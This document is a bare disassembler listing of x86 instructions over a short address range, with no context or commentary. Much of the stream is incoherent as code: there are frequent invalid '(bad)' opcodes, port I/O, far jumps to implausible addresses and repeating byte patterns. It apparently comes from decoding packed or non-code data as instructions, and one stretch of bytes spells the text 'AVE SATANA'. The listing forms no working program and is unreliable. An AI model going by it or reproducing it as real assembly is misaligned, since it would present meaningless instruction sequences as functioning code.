  493586:	repz cmp al,0xcf
  493589:	inc    esp
  49358a:	push   esp
  49358b:	fs js  0x493516
  49358e:	cwde   
  49358f:	cmp    al,0xcf
  493591:	repz cmp al,0xac
  493594:	mov    esp,0x79ecdccc
  493599:	sahf   
  49359a:	out    0xf3,al
  49359c:	cld    
  49359d:	or     BYTE PTR [esi],al
  49359f:	sbb    al,0x2c
  4935a1:	cmp    al,0xde
  4935a3:	xor    esp,DWORD PTR [edi-0x19]
  4935a6:	push   eax
  4935a7:	call   0x155039af
  4935ac:	add    al,0x3b
  4935ae:	scas   eax,DWORD PTR es:[edi]
  4935af:	fxch   st(6)
  4935b1:	enter  0xd80e,0x6
  4935b5:	call   0xc2e3cbbb
  4935ba:	ds push esp
  4935bc:	push   eax
  4935bd:	inc    esi
  4935be:	xor    BYTE PTR [edi],dl
  4935c0:	mov    bh,0xae
  4935c2:	inc    ebp
  4935c3:	pop    esp
  4935c4:	lods   al,BYTE PTR ds:[esi]
  4935c5:	mov    DWORD PTR [edx],eax
  4935c7:	dec    esi
  4935c8:	xchg   edx,eax
  4935c9:	push   es
  4935ca:	and    ch,ch
  4935cc:	mov    al,ds:0xc709bfa7
  4935d1:	add    DWORD PTR [edx],ebx
  4935d3:	mov    WORD PTR [edx],gs
  4935d5:	test   al,0xbe
  4935d7:	or     esi,edx
  4935d9:	or     eax,0xb0340fe2
  4935de:	push   esp
  4935df:	in     al,dx
  4935e0:	xor    al,BYTE PTR [ecx]
  4935e2:	jg     0x49356f
  4935e4:	and    DWORD PTR [edx],0xffffff9c
  4935e7:	std    
  4935e8:	aaa    
  4935e9:	pop    ecx
  4935ea:	jmp    0xbfb201fe
  4935ef:	popf   
  4935f0:	es xchg esp,eax
  4935f2:	in     al,0x1c
  4935f4:	scas   al,BYTE PTR es:[edi]
  4935f5:	inc    ecx
  4935f6:	sbb    ah,BYTE PTR [ecx+0x58]
  4935f9:	xor    DWORD PTR [edi],eax
  4935fb:	sub    DWORD PTR [eax+0x6],0xabeef761
  493602:	scas   eax,DWORD PTR es:[edi]
  493603:	push   edi
  493604:	cld    
  493605:	ret    
  493606:	inc    ecx
  493607:	sbb    DWORD PTR [esp+eax*8],ecx
  49360a:	jle    0x49361c
  49360c:	and    BYTE PTR [esi],cl
  49360e:	out    dx,eax
  49360f:	mov    ecx,0x30809ee7
  493614:	pop    ds
  493615:	and    BYTE PTR [eax+0x1f],al
  493618:	add    dl,BYTE PTR [eax+0x3f]
  49361b:	and    al,0xe8
  49361d:	mov    ah,0xe5
  49361f:	add    BYTE PTR [eax],0x64
  493622:	push   cs
  493623:	je     0x4935de
  493625:	pavgb  mm5,QWORD PTR [esi-0x59f17b5a]
  49362c:	cwde   
  49362d:	aas    
  49362e:	(bad)  
  49362f:	fidivr DWORD PTR [ebx-0x12]
  493632:	adc    BYTE PTR [eax+0x7fb80e1f],ch
  493638:	adc    ah,cl
  49363a:	aas    
  49363b:	inc    DWORD PTR [eax]
  49363d:	fdiv   QWORD PTR ds:0xff5f2def
  493643:	add    al,dh
  493645:	inc    eax
  493646:	lds    edi,FWORD PTR [esi-0x24]
  493649:	adc    ah,bh
  49364b:	sar    DWORD PTR [esi+edi*8+0xe],cl
  49364f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  493650:	retf   0xf0
  493653:	sub    bh,bh
  493655:	sti    
  493656:	cmp    al,0xa0
  493658:	mov    al,ds:0xcf4c00a4
  49365d:	repz mov esp,0x60620af7
  493663:	push   cs
  493664:	add    bh,BYTE PTR [eax+0xc]
  493667:	nop
  493668:	cmp    al,0xcf
  49366a:	repz cmp al,0x1
  49366d:	test   al,0xf
  49366f:	rcl    BYTE PTR [esi+edx*8],0x3d
  493673:	iret   
  493674:	repz aam 0x10
  493677:	in     al,dx
  493678:	adc    dh,cl
  49367a:	(bad)  
  49367b:	push   cs
  49367c:	iret   
  49367d:	imul   esi,DWORD PTR [esi+ebx*4+0x9],0x14
  493682:	gs sub al,0x1e
  493685:	sbb    eax,DWORD PTR [eax-0xd]
  493688:	cmp    al,0xcf
  49368a:	cmp    eax,0x110eaf1c
  49368f:	test   BYTE PTR ds:0xcf3cf3cf,cl
  493695:	cwde   
  493696:	push   cs
  493697:	lods   al,BYTE PTR ds:[esi]
  493698:	sbb    al,ah
  49369a:	or     edi,DWORD PTR [esi]
  49369c:	iret   
  49369d:	repz cmp al,0xd8
  4936a0:	add    esi,esp
  4936a2:	adc    edx,DWORD PTR [eax]
  4936a4:	(bad)  
  4936a5:	jns    0x493645
  4936a7:	out    0x69,eax
  4936a9:	sbb    BYTE PTR [eax],dh
  4936ab:	pop    ss
  4936ac:	inc    esp
  4936ad:	add    al,0xe7
  4936af:	jns    0x49364f
  4936b1:	out    0x58,eax
  4936b3:	push   ds
  4936b4:	push   0xde7b7c1d
  4936b9:	pop    es
  4936ba:	lahf   
  4936bb:	pop    es
  4936bc:	xchg   esp,eax
  4936bd:	(bad)  
  4936be:	fistp  WORD PTR [edi]
  4936c0:	test   al,0x1e
  4936c2:	add    BYTE PTR [eax+0x3cf3cf0e],bh
  4936c8:	iret   
  4936c9:	adc    eax,0x5e416cc
  4936ce:	clc    
  4936cf:	popf   
  4936d0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4936d1:	stc    
  4936d2:	cmp    al,0x6
  4936d4:	or     al,0xc8
  4936d6:	or     BYTE PTR [ecx+edi*2],ah
  4936d9:	sahf   
  4936da:	out    0x5d,eax
  4936dc:	ja     0x4936ec
  4936de:	add    DWORD PTR [eax+0x79e7d002],edi
  4936e4:	sahf   
  4936e5:	out    0x4d,eax
  4936e7:	call   0xcfcb336c
  4936ec:	repz cmp al,0xcd
  4936ef:	sbb    cl,cl
  4936f1:	xor    BYTE PTR [eax],0x86
  4936f4:	dec    eax
  4936f5:	mov    BYTE PTR [edi+ecx*8],bh
  4936f8:	repz cmp al,0x60
  4936fb:	mov    eax,ds:0xf394a27c
  493700:	cmp    al,0xcf
  493702:	repz mov cl,0xac
  493705:	mov    dl,0xc4
  493707:	mov    edx,0xcf3cf3e6
  49370c:	fmul   st(4),st
  49370e:	hlt    
  49370f:	fimul  WORD PTR [edx+ecx*8]
  493712:	sbb    al,0xe7
  493714:	jns    0x4936b4
  493716:	out    dx,al
  493717:	and    al,0xff
  493719:	inc    eax
  49371a:	mov    ebx,0x6d69a512
  49371f:	adc    ebx,DWORD PTR [edi]
  493721:	dec    edi
  493722:	out    dx,eax
  493723:	push   ebp
  493724:	lods   al,BYTE PTR ds:[esi]
  493725:	or     eax,0xb223bd6
  49372a:	xor    cl,BYTE PTR ds:0xe2c0e42
  493730:	fidivr WORD PTR [ebx+0x46]
  493733:	or     al,0x56
  493735:	punpckldq mm1,DWORD PTR [ecx]
  493738:	ret    0xbb07
  49373b:	in     eax,dx
  49373c:	xor    BYTE PTR [ebx+0x30401d7],0x7e
  493743:	pop    es
  493744:	cmp    DWORD PTR [edi],ebx
  493746:	(bad)  
  493747:	in     eax,dx
  493748:	(bad)  
  493749:	or     DWORD PTR [eax-0x11e67fef],eax
  49374f:	out    0xec,eax
  493751:	jge    0x49370f
  493753:	jnp    0x493718
  493755:	or     ch,dl
  493757:	mov    ebx,0x9ef9f719
  49375c:	inc    eax
  49375d:	arpl   WORD PTR [esi-0x18],ax
  493760:	push   es
  493761:	adc    BYTE PTR [ecx-0x19],dl
  493764:	jns    0x493704
  493766:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  493767:	and    BYTE PTR [eax+eax*2],ch
  49376a:	dec    esp
  49376b:	fs sahf 
  49376d:	out    0x79,eax
  49376f:	sahf   
  493770:	je     0x4936fa
  493772:	xchg   esp,eax
  493773:	mov    al,ds:0x9f77c0b4
  493778:	out    0x79,eax
  49377a:	aam    0xe0
  49377c:	clc    
  49377d:	or     BYTE PTR [edx+0x7e],dl
  493780:	push   es
  493781:	sahf   
  493782:	out    0x79,eax
  493784:	sahf   
  493785:	and    al,0x34
  493787:	inc    esp
  493788:	push   esp
  493789:	push   0xc23ca880
  49378e:	jns    0x493724
  493790:	jae    0x493712
  493792:	add    DWORD PTR [ebp-0x71],ebp
  493795:	aaa    
  493796:	cmp    bh,bh
  493798:	add    al,BYTE PTR [edi]
  49379a:	loopne 0x4937d7
  49379c:	push   cs
  49379d:	lods   al,BYTE PTR ds:[esi]
  49379e:	popa   
  49379f:	call   0x6231:0x79100d90
  4937a6:	pop    ss
  4937a7:	sbb    ebx,edx
  4937a9:	and    eax,0x21801180
  4937ae:	loopne 0x493760
  4937b0:	pop    ebp
  4937b1:	in     al,dx
  4937b2:	xor    BYTE PTR [ecx],0x80
  4937b5:	comiss xmm6,DWORD PTR [esi-0x4f]
  4937b9:	sbb    ebp,0xff11002d
  4937bf:	and    edi,edi
  4937c1:	xor    ebp,edx
  4937c3:	shl    BYTE PTR [esi],cl
  4937c5:	sub    al,0x67
  4937c7:	jle    0x4937a5
  4937c9:	pop    ss
  4937ca:	in     al,0x5b
  4937cc:	fild   QWORD PTR gs:[edi]
  4937cf:	sti    
  4937d0:	movhps xmm0,QWORD PTR [ecx-0x363636f6]
  4937d7:	in     eax,dx
  4937d8:	add    cl,BYTE PTR [edi]
  4937da:	or     al,0x1
  4937dc:	bswap  ecx
  4937de:	leave  
  4937df:	leave  
  4937e0:	leave  
  4937e1:	adc    al,0x10
  4937e3:	adc    cl,BYTE PTR [ecx]
  4937e5:	daa    
  4937e6:	fst    st(3)
  4937e8:	xchg   BYTE PTR ds:0xe0d0ff7,dh
  4937ee:	daa    
  4937ef:	daa    
  4937f0:	daa    
  4937f1:	daa    
  4937f2:	or     eax,DWORD PTR [ebx]
  4937f4:	adc    ebx,DWORD PTR [eax]
  4937f6:	es daa 
  4937f8:	daa    
  4937f9:	daa    
  4937fa:	pop    ss
  4937fb:	add    al,0x7
  4937fd:	jb     0x49381a
  4937ff:	or     BYTE PTR [edi+eax*8+0x160f15d1],bl
  493806:	shl    DWORD PTR [edx+0x72],1
  493809:	jb     0x493810
  49380b:	push   es
  49380c:	push   ds
  49380d:	push   ecx
  49380e:	iret   
  49380f:	popa   
  493810:	mov    ebp,0xb1207648
  493815:	test   BYTE PTR [esi],0x30
  493818:	addr16 shr dh,1
  49381b:	cmp    al,0x38
  49381d:	add    DWORD PTR [edi+eiz*4-0x42],eax
  493821:	push   es
  493822:	sahf   
  493823:	out    0x79,eax
  493825:	sahf   
  493826:	pop    esp
  493827:	push   0xa8988878
  49382c:	neg    DWORD PTR [esi-0x3b4b8619]
  493832:	fadd   DWORD PTR [eax+0x66]
  493835:	dec    eax
  493836:	push   es
  493837:	sahf   
  493838:	out    0x79,eax
  49383a:	sahf   
  49383b:	push   eax
  49383c:	pop    eax
  49383d:	push   0x22807870
  493842:	es iret 
  493844:	repz mov dh,0x88
  493847:	nop
  493848:	pusha  
  493849:	cmc    
  49384a:	repz mov edi,0x703efd0
  493850:	or     eax,0x30f0e0b
  493855:	nop
  493856:	mov    ah,0xdb
  493858:	inc    edx
  493859:	sahf   
  49385a:	out    0x75,eax
  49385c:	mov    al,ds:0xfd0ec8a3
  493861:	fdivr  st,st(4)
  493863:	jl     0x493803
  493865:	out    0x79,eax
  493867:	call   0xd433166
  49386c:	fdivr  st(3),st
  49386e:	cmp    al,0xcf
  493870:	sar    eax,cl
  493872:	and    bh,dh
  493874:	xor    al,0xf6
  493876:	iret   
  493877:	repz cmp al,0xcf
  49387a:	dec    eax
  49387b:	cmc    
  49387c:	pop    esp
  49387d:	hlt    
  49387e:	jo     0x493873
  493880:	cmp    al,0xcf
  493882:	repz cmp al,0x80
  493885:	repnz xchg esp,eax
  493887:	icebp  
  493888:	test   al,0xf3
  49388a:	cmp    al,0xcf
  49388c:	repz lock mov esp,0xe6eed0ef
  493893:	repz cmp al,0xcf
  493896:	in     al,0xed
  493898:	hlt    
  493899:	in     al,dx
  49389a:	or     ch,bl
  49389c:	out    0xe4,eax
  49389e:	jns    0x49383e
  4938a0:	jmp    0x4938ba
  4938a2:	jmp    0x742a:0xa2b8402c
  4938a9:	add    DWORD PTR [edi+0x4cd01f2],edx
  4938af:	adc    BYTE PTR [ebx-0x50c83298],cl
  4938b5:	popa   
  4938b6:	push   0xebc1e253
  4938bb:	and    BYTE PTR [edi+0x8],0x9
  4938bf:	pop    ebp
  4938c0:	loope  0x49391f
  4938c2:	outs   dx,BYTE PTR ds:[esi]
  4938c3:	add    ah,BYTE PTR [esi-0x70]
  4938c6:	xchg   ecx,eax
  4938c7:	out    dx,eax
  4938c8:	dec    ebx
  4938c9:	xor    BYTE PTR [eax-0x79],bh
  4938cc:	add    BYTE PTR [edx+0x6e],bl
  4938cf:	daa    
  4938d0:	inc    esp
  4938d1:	or     edi,edx
  4938d3:	xchg   BYTE PTR [ebp+0x90b03fd],ch
  4938d9:	add    DWORD PTR [ecx],ecx
  4938db:	add    cl,bh
  4938dd:	mov    edi,0xeed41f10
  4938e2:	lods   al,BYTE PTR ds:[esi]
  4938e3:	fcmovu st,st(5)
  4938e5:	std    
  4938e6:	inc    ebx
  4938e7:	adc    BYTE PTR [esi+0x18],ah
  4938ea:	nop
  4938eb:	daa    
  4938ec:	call   0x1c0:0x53792ea6
  4938f3:	or     BYTE PTR [esi],bl
  4938f5:	add    eax,DWORD PTR [eax+0xa]
  4938f8:	push   es
  4938f9:	mov    dh,0xaa
  4938fb:	xlat   BYTE PTR ds:[ebx]
  4938fc:	daa    
  4938fd:	or     bh,dh
  4938ff:	loopne 0x493943
  493901:	fcmovu st,st(2)
  493903:	outs   dx,DWORD PTR ds:[esi]
  493904:	inc    eax
  493905:	add    ah,BYTE PTR [eax+0x4b]
  493908:	jnp    0x493981
  49390a:	lods   eax,DWORD PTR ds:[esi]
  49390b:	mov    DWORD PTR [edi+0x591f1304],ebx
  493911:	add    BYTE PTR [ecx],cl
  493913:	mov    bh,0xa1
  493915:	add    al,0x6b
  493917:	das    
  493918:	mov    BYTE PTR [ecx+eax*4],0xae
  49391c:	inc    DWORD PTR [ecx]
  49391e:	unpckhps xmm1,xmm1
  493921:	adc    eax,0x14a769b7
  493926:	out    0x2,eax
  493928:	or     eax,0xbc9c9c04
  49392d:	mov    eax,0x402087b0
  493932:	add    esp,esp
  493934:	(bad)  
  493935:	ins    DWORD PTR es:[edi],dx
  493936:	xchg   edi,eax
  493937:	push   es
  493938:	xchg   DWORD PTR [edi+0x7],esp
  49393b:	pop    ss
  49393c:	add    DWORD PTR [ebp*8+0x6fb5b7b5],edi
  493943:	xchg   BYTE PTR [edi+0x6],bh
  493946:	stc    
  493947:	mov    esi,ebx
  493949:	cmp    al,0xcf
  49394b:	repz mov cl,BYTE PTR [eax-0x30030406]
  493952:	repz cmp al,0xcf
  493955:	std    
  493956:	(bad)  
  493957:	inc    BYTE PTR [edx]
  493959:	add    al,0x84
  49395b:	cmp    al,0xcf
  49395d:	repz cmp al,0x82
  493960:	test   DWORD PTR [ebx+0x23510186],eax
  493966:	into   
  493967:	repz add eax,DWORD PTR [eax]
  49396a:	pop    es
  49396b:	jmp    0x49393e
  49396d:	pop    ecx
  49396e:	mov    BYTE PTR [esi-0x5bd0bb11],ch
  493974:	mov    ebx,0x362f7cd2
  493979:	push   es
  49397a:	test   al,0x31
  49397c:	mov    ah,0x13
  49397e:	mov    ecx,0xffff200b
  493983:	pop    ss
  493984:	popa   
  493985:	add    BYTE PTR [esi+0x7c14bde8],dh
  49398b:	mov    bl,0x1f
  49398d:	int    0x10
  49398f:	jmp    0x49398f
  493991:	inc    ecx
  493992:	push   esi
  493993:	inc    ebp
  493994:	and    BYTE PTR [ebx+0x41],dl
  493997:	push   esp
  493998:	inc    ecx
  493999:	dec    esi
  49399a:	inc    ecx
  49399b:	cmp    dl,BYTE PTR [ecx+0x54]
  49399e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  49399f:	push   ebx
  4939a0:	push   ebx
  4939a1:	stos   BYTE PTR es:[edi],al
  4939a2:	push   ebp
  4939a3:	ds aaa 
  4939a5:	ss pop ds
  4939a7:	ds or  al,0xd8
  4939aa:	or     eax,0x70540ed6
  4939af:	add    eax,0x1787e852
  4939b4:	jl     0x493a35
  4939b6:	ds ds xor al,0x32
  4939ba:	lods   eax,DWORD PTR ds:[esi]
  4939bb:	je     0x493a2b
  4939bd:	adc    BYTE PTR [eax-0x6d5f7119],bh
  4939c3:	pop    es
  4939c4:	push   ds
  4939c5:	mov    WORD PTR [esi-0x11],ss
  4939c8:	mov    ch,0xd0
  4939ca:	pop    ss
  4939cb:	data16 adc BYTE PTR [eax+0x45],ah
  4939cf:	mov    edi,0x6082644
  4939d4:	sbb    al,0xba
  4939d6:	paddusw mm7,QWORD PTR [ebp+0x7e]
  4939da:	dec    esp
  4939db:	mov    DWORD PTR [esi],edx
  4939dd:	dec    esi
  4939de:	push   ss
  4939df:	clc    
  4939e0:	inc    esi
  4939e1:	jnp    0x4939b2
  4939e3:	sbb    DWORD PTR [edi],0xeb0c8fe
  4939e9:	sbb    BYTE PTR es:[esi],al
  4939ec:	test   BYTE PTR [esi],bl
  4939ee:	sar    DWORD PTR [esi+0x664dc0f],cl
  4939f4:	sahf   
  4939f5:	jo     0x493a25
  4939f7:	in     al,dx
  4939f8:	xchg   DWORD PTR [esi+0x6c],ebp
  4939fb:	inc    ebx
  4939fc:	int    0xf7
  4939fe:	fidiv  WORD PTR [eax+0xe0416]
  493a04:	cs js  0x493a15
  493a07:	aam    0xde
  493a09:	jnp    0x493a7a
  493a0b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  493a0c:	xchg   esi,eax
  493a0d:	mov    ah,0x1c
  493a0f:	mov    dh,0x20
  493a11:	jbe    0x493a4f
  493a13:	ds hlt 
  493a15:	push   es
  493a16:	xor    al,0xde
  493a18:	dec    eax
  493a19:	data16 jge 0x4939d0
  493a1c:	arpl   WORD PTR [esi-0x4143e9c2],ax
  493a22:	neg    DWORD PTR [esi-0x9780385]
  493a28:	mov    ah,0xb6
  493a2a:	ins    BYTE PTR es:[edi],dx
  493a2b:	push   es
  493a2c:	xor    BYTE PTR [esi-0x38],bl
  493a2f:	or     eax,0xef7bcf7b
  493a34:	xchg   esi,eax
  493a35:	shl    BYTE PTR es:[esi+0x6080c614],1
  493a3c:	push   es
  493a3d:	test   al,0x1e
  493a3f:	xchg   edi,eax
  493a40:	gs popf 
  493a42:	out    0x64,al
  493a44:	jb     0x4939d6
  493a46:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  493a47:	jnp    0x493a38
  493a49:	jns    0x493a29
  493a4b:	mov    al,ds:0x850841e
  493a50:	pop    esi
  493a51:	or     al,0xde
  493a53:	sub    al,0x6
  493a55:	cmp    eax,0x58df35ef
  493a5a:	push   ds
  493a5b:	enter  0x8060,0x8e
  493a5f:	call   0xef4d7eaa
  493a64:	jge    0x493a2f
  493a66:	(bad)  
  493a67:	cs ins BYTE PTR es:[edi],dx
  493a69:	adc    BYTE PTR [esi],cl
  493a6b:	cwde   
  493a6c:	es inc eax
  493a6e:	test   BYTE PTR ds:0xb0ce7b80,cl
  493a74:	jmp    DWORD PTR [esi+0x78]
  493a77:	mov    al,0x9e
  493a79:	neg    DWORD PTR [esi-0x2bb1308c]
  493a7f:	fmulp  st(4),st
  493a81:	push   es
  493a82:	fmul   QWORD PTR [eax]
  493a84:	jo     0x493a24
  493a86:	test   DWORD PTR [esi],0xc436a09e
  493a8c:	cs inc esp
  493a8e:	mov    edi,gs
  493a90:	mov    ebp,0x9e2e9d2b
  493a95:	loopne 0x493ac5
  493a97:	mov    eax,0x4c1624be
  493a9c:	lock fidivr WORD PTR [ebx-0x5b]
  493aa0:	jno    0x493ac1
  493aa2:	push   0x9c06185e
  493aa7:	push   ds
  493aa8:	push   eax
  493aa9:	jo     0x493b0b
  493aab:	add    dh,BYTE PTR [edi+0x1e]
  493aae:	call   0x3c396af1
  493ab3:	mov    eax,0x16669dc2
  493ab8:	cs cld 
  493aba:	push   es
  493abb:	fcomp  st(7)
  493abd:	and    DWORD PTR [edi+0x38b69f34],0xffffffb2
  493ac4:	pop    esp
  493ac5:	pop    esi
  493ac6:	and    al,0xcf
  493ac8:	pop    ebp
  493ac9:	imul   esi,eax,0x40f0663c
  493acf:	inc    esi
  493ad0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  493ad1:	or     al,0xac
  493ad3:	xor    al,0x78
  493ad5:	out    dx,eax
  493ad6:	es cwde 
  493ad8:	push   ds
  493ad9:	jl     0x493b09
  493adb:	les    edx,FWORD PTR [esi-0x52]
  493ade:	out    dx,eax
  493adf:	mov    ebp,0xf00e2b87
  493ae4:	test   BYTE PTR [eax-0x5bd1eb82],0x6
  493aeb:	push   eax
  493aec:	pop    esp
  493aed:	cmp    bh,BYTE PTR [eax-0x7b]
  493af0:	push   cs
  493af1:	push   edi
  493af2:	or     al,0xe6
  493af4:	cmp    al,0x8f
  493af6:	stc    
  493af7:	icebp  
  493af8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  493af9:	rcr    BYTE PTR [edi+ecx*8],cl
  493afc:	adc    BYTE PTR [esi],dh
  493afe:	fs movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  493b01:	jo     0x493afa
  493b03:	add    BYTE PTR [ebx+0x2e7f57c7],0xc6
  493b0a:	pop    es
  493b0b:	iret   
  493b0c:	pop    ecx
  493b0d:	mov    esp,0xfb4b6c0
  493b12:	push   edi
  493b13:	push   cs
  493b14:	js     0x493b54
  493b16:	sub    al,0xf3
  493b18:	loop   0x493b93
  493b1a:	call   0x5886:0x9400a88a
  493b21:	mov    DWORD PTR [edx],eax
  493b23:	jo     0x493b14
  493b25:	mov    ebp,0x5c76a456
  493b2a:	push   es
  493b2b:	mov    al,ds:0xcf787066
  493b30:	mov    ebx,0x1cd61488
  493b35:	push   0x7d478856
  493b3a:	jmp    0x36d8ef2d
  493b3f:	int3   
  493b40:	arpl   WORD PTR [esi],bp
  493b42:	ss xchg ah,al
  493b45:	repz jecxz 0x493bc1
  493b48:	out    dx,eax
  493b49:	ds sub al,0x2e
  493b4c:	pop    esp
  493b4d:	mov    dh,0x18
  493b4f:	xchg   esp,eax
  493b50:	inc    al
  493b52:	mov    al,0x50
  493b54:	out    dx,eax
  493b55:	cmp    eax,0x98beff87
  493b5a:	push   ss
  493b5b:	int3   
  493b5c:	push   esi
  493b5d:	je     0x493b44
  493b5f:	push   ds
  493b60:	mov    esi,0x50ce3790
  493b65:	es dec eax
  493b67:	fisttp WORD PTR [eax]
  493b69:	mov    eax,0xece0d47
  493b6e:	xchg   esi,edi
  493b70:	neg    DWORD PTR [esi-0x18b13c7d]
  493b76:	fistp  WORD PTR [esi+0x0]
  493b79:	inc    esi
  493b7a:	mov    al,ds:0x2868cf2e
  493b7f:	mov    eax,eax
  493b81:	pop    ss
  493b82:	(bad)  
  493b83:	ja     0x493b9b
  493b85:	lods   al,BYTE PTR ds:[esi]
  493b86:	test   DWORD PTR [esi],0x1e8f0e71
  493b8c:	out    dx,al
  493b8d:	nop
  493b8e:	push   esi
  493b8f:	clc    
  493b90:	push   es
  493b91:	sahf   
  493b92:	out    0x3d,eax
  493b94:	mov    esi,eax
  493b96:	dec    edi
  493b97:	push   es
  493b98:	cld    
  493b99:	sub    BYTE PTR cs:[eax+0x67db3bc8],0xf4
  493ba1:	push   cs
  493ba2:	in     al,0x97
  493ba4:	scas   al,BYTE PTR es:[edi]
  493ba5:	dec    esp
  493ba6:	jo     0x493c0e
  493ba8:	in     al,0x70
  493baa:	push   ss
  493bab:	shl    cl,0x79
  493bae:	iret   
  493baf:	test   BYTE PTR [eax],ch
  493bb1:	ss je  0x493c30
  493bb4:	das    
  493bb5:	pop    edi
  493bb6:	and    BYTE PTR [ebp-0x2c],dh
  493bb9:	into   
  493bba:	(bad)  
  493bbb:	outs   dx,BYTE PTR ds:[esi]
  493bbc:	jo     0x493b5c
  493bbe:	not    DWORD PTR [esi+0x7a]
  493bc1:	sub    BYTE PTR ds:[esi],al
  493bc4:	ds loopne 0x493c0d
  493bc7:	int3   
  493bc8:	xchg   esp,eax
  493bc9:	mov    esp,0xd4783cd7
  493bce:	fisub  WORD PTR [edx+ecx*4+0x2eb03660]
  493bd5:	aam    0x1c
  493bd7:	cmp    al,0x62
  493bd9:	lock sbb BYTE PTR [esi-0x7a],al
  493bdd:	push   esp
  493bde:	cs in  al,dx
  493be0:	test   bl,dl
  493be2:	sar    DWORD PTR [edx+0x67],cl
  493be5:	mov    BYTE PTR [esi],cl
  493be7:	mov    esp,0xdef09ff8
  493bec:	repz push ds
  493bee:	and    al,0x4e
  493bf0:	xor    al,0x9c
  493bf2:	es or  al,0xb6
  493bf5:	shl    BYTE PTR [eax+0xf],1
  493bf8:	sahf   
  493bf9:	repnz xchg al,ch
  493bfc:	outs   dx,BYTE PTR ds:[esi]
  493bfd:	sar    BYTE PTR [esi],1
  493bff:	xor    BYTE PTR [eax+0x39a54c7e],al
  493c05:	jne    0x493bc5
  493c07:	adc    al,0x7
  493c09:	dec    eax
  493c0a:	out    0x1,al
  493c0c:	dec    edx
  493c0d:	add    al,BYTE PTR [eax+0x40]
  493c10:	adc    eax,0x202882c8
  493c15:	nop
  493c16:	push   eax
  493c17:	add    BYTE PTR [edx+eax*1+0x26],cl
  493c1b:	and    al,al
  493c1d:	es inc eax
  493c1f:	jo     0x493c0b
  493c21:	sti    
  493c22:	push   es
  493c23:	pushf  
  493c24:	pusha  
  493c25:	push   cs
  493c26:	rol    BYTE PTR [ebp+0x77],1
  493c29:	add    DWORD PTR [ecx],edx
  493c2b:	sbb    eax,DWORD PTR [ecx+eax*1-0x77]
  493c2f:	or     BYTE PTR [eax],cl
  493c31:	and    al,0x42
  493c33:	add    DWORD PTR [eax+eiz*1-0x7c],edx
  493c37:	add    ch,BYTE PTR [eax+0x55417a40]
  493c3d:	add    DWORD PTR [esi],0x120a0300
  493c43:	shl    BYTE PTR [esi+edi*2-0x57],cl
  493c47:	dec    edi
  493c48:	mov    ebx,0x64100df
  493c4d:	or     eax,DWORD PTR [eax]
  493c4f:	push   eax
  493c50:	push   cs
  493c51:	sbb    cl,BYTE PTR [ebx+0x47]
  493c54:	add    BYTE PTR [ebx],ah
  493c56:	and    al,0x6c
  493c58:	and    dh,BYTE PTR [edx+0x0]
  493c5b:	dec    esi
  493c5c:	cmp    cl,BYTE PTR [ebx+0x4f6d7d0d]
  493c62:	add    BYTE PTR [edx+0x54],cl
  493c65:	rsqrtps xmm5,XMMWORD PTR [esi-0x84fffcf]
  493c6c:	pop    esi
  493c6d:	mov    ebx,0x4f462e04
  493c72:	or     BYTE PTR ss:[esi],bl
  493c75:	inc    ecx
  493c76:	dec    ebx
  493c77:	and    esp,DWORD PTR [eax-0x58]
  493c7a:	fwait
  493c7b:	rol    BYTE PTR [edi],1
  493c7d:	mov    edx,0xc3a4e28
  493c82:	dec    ebp
  493c83:	push   edi
  493c84:	inc    eax
  493c85:	add    al,BYTE PTR [ecx]
  493c87:	add    dh,BYTE PTR [edi-0x406b73be]
  493c8d:	repz dec ebp
  493c8f:	gs jbe 0x493ca2
  493c92:	inc    BYTE PTR [edi]
  493c94:	add    edi,edi
  493c96:	add    edi,DWORD PTR [esi]
  493c98:	iret   
  493c99:	xchg   edi,eax
  493c9a:	das    
  493c9b:	add    BYTE PTR [eax],0x7
  493c9e:	rol    BYTE PTR [eax],0xd
  493ca1:	sbb    eax,0x34f2fe19
  493ca6:	sub    DWORD PTR [ecx+eax*1-0x4a],0x0
  493cab:	mov    al,0x80
  493cad:	fimul  DWORD PTR es:[edx]
  493cb0:	adc    al,BYTE PTR [edi]
  493cb2:	add    DWORD PTR [ecx],eax
  493cb4:	retf   
  493cb5:	xchg   edi,eax
  493cb6:	or     ecx,ebx
  493cb8:	push   es
  493cb9:	inc    BYTE PTR [eax]
  493cbb:	cld    
  493cbc:	jg     0x493cbd
  493cbe:	clc    
  493cbf:	iret   
  493cc0:	leave  
  493cc1:	repz in eax,0x3f
  493cc4:	push   eax
  493cc6:	pop    ds
  493cc7:	jmp    eax
  493cc9:	rol    ah,0xfc
  493ccc:	and    al,0xef
  493cce:	imul   ebp,DWORD PTR [ebx],0x95e3f01
  493cd4:	clts   
  493cd6:	aas    
  493cd7:	or     al,0xab
  493cd9:	sub    ecx,ebx
  493cdb:	(bad)  
  493cdc:	je     0x493cbb
  493cde:	addr16 xchg esp,eax
  493ce0:	cmp    al,0x93
  493ce2:	pop    es
  493ce3:	add    BYTE PTR [eax],0x2
  493ce6:	mov    bl,0xd9
  493ce8:	into   
  493ce9:	push   cs
  493cea:	or     ch,BYTE PTR [eax-0x2fa7f2f1]
  493cf0:	push   cs
  493cf1:	mov    eax,0x4ada7007
  493cf6:	dec    eax
  493cf7:	add    esp,DWORD PTR [bx+si-0x4b]
  493cfb:	rol    esp,cl
  493cfd:	ds int 0xf6
  493d00:	add    ah,BYTE PTR [eax+0xf500566]
  493d06:	psubb  mm7,QWORD PTR [edi-0x27]
  493d0a:	ins    BYTE PTR es:[edi],dx
  493d0b:	inc    ebx
  493d0c:	ret    
  493d0d:	add    BYTE PTR [edi-0x11],ah
  493d10:	push   es
  493d11:	out    0x18,eax
  493d13:	ficomp DWORD PTR [ebx-0x4cb0c1e6]
  493d19:	neg    bl
  493d1b:	out    dx,al
  493d1c:	(bad)  
  493d1e:	cmp    esi,DWORD PTR [edi+0x1a]
  493d21:	dec    esi
  493d22:	jb     0x493d9a
  493d24:	rol    BYTE PTR [ecx],0x7
  493d27:	loopne 0x493d2c
  493d29:	lock pop es
  493d2b:	sbb    al,bh
  493d2d:	popf   
  493d2e:	dec    ebx
  493d2f:	mov    dl,0x55
